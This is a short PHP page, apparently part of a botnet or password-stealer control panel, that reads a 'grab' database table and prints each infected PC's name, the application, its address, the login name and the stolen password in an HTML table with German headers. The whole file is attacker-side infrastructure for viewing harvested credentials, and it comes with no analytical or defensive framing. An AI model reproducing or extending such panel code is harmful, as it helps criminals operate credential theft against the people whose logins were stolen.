<?php
	include('include/config.php');
	$query = panel_sql_request("SELECT * FROM ".$sql_table['grab']." ORDER BY PCname;");
	echo "<table width=100%>";
	echo '<td class="td">|<img src="img/bot.png"> NAME</td>
	<td class="td">|<img src="img/version.png"> ANWENDUNG</td>
	<td class="td">|<img src="img/herkunft.png"> ADRESSE</td>
	<td class="td">|<img src="img/hwid.png"> LOGIN NAME</td>
	<td class="td">|<img src="img/serial.png"> PASSWORT</td>
	</tr>';
	
	echo "<tr><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td><td>-
		 </td></tr>";

	while($row = $query->fetch_assoc()){
					  echo '<td class="td">|'.$row['PCname'].'</td>
					        <td class="td">|'.$row['ToolName'].'</td>
						    <td class="td">|'.$row['LinkTool'].'</td>
							<td class="td">|'.$row['LoginName'].'</td>
							<td class="td">|'.$row['PassGrabb'].'</td>
					  </tr>';							 
	}
	echo "</table>";
?>